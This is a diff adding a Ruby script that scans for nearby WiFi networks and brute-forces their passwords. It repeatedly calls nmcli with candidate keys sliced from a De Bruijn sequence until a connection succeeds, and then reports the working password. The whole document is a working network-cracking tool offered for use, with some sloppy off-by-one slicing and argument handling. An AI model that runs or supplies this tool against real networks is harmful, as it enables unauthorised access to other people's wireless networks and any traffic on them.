@@ -1,0 +1,56 @@
+#!/bin/ruby
+require 'open3'
+require './debruij'
+
+def get_wifi_list
+	`sudo ifconfig wlp2s0 down`
+	`sudo ifconfig wlp2s0 up`
+	stdout, stderr, status = Open3.capture3("sudo iwlist wlp2s0 scan | grep ESSID | cut -d: -f2 | tr -d '\"'")
+	wifi_list = []
+	stdout.split("\n").map() { |elem| wifi_list += [elem] }
+	puts "No Wifi was found in this area !" if wifi_list.size == 0
+	return wifi_list
+end
+
+def try_connection_with_passw(wifi, key_len = 1, keys)
+	(0..keys.size).each do |i|
+		stdout, stderr, status = Open3.capture3("sudo nmcli d wifi c \"#{wifi}\" password #{keys[i..i + key_len]}")
+		if stderr.include?("Error:") || stdout.include?("Error:")
+			puts "\tError the connection failed with pass #{keys[i..i + key_len]}"
+			stdout, stderr, status = Open3.capture3("sudo nmcli connection delete \"#{wifi}\"")
+		else
+			puts "Sucessfuly connected to #{wifi} with pass #{keys[i..i + key_len]}"
+			return true
+		end
+	end
+	return false
+end
+
+def try_connection wifi_list, alpha, key_len = 1
+	keys = debrujGenerator(alpha, key_len)
+	wifi_list.each do |wifi_name|
+		puts "Trying connection to Wifi: #{wifi_name}"
+		stdout, stderr, status = Open3.capture3("sudo nmcli d wifi c \"#{wifi_name}\"")
+		if stderr.include?("Error:") || stdout.include?("Error:")
+			puts "Error the connection failed with no pass"
+			stdout, stderr, status = Open3.capture3("sudo nmcli connection delete \"#{wifi_name}\"")
+			return if try_connection_with_passw(wifi_name, key_len - 1, keys)
+		else
+			puts "Sucessfuly connected"
+			break
+		end
+	end
+end
+
+# puts debrujGenerator "abc", 2
+# puts debrujGenerator "01", 20
+
+
+
+if ARGV.size == 2
+	wifi_list = get_wifi_list()
+else
+	wifi_list = [ARGV[0]]
+end
+return if wifi_list.size == 0
+try_connection(wifi_list, ARGV[1], ARGV[2].to_i)
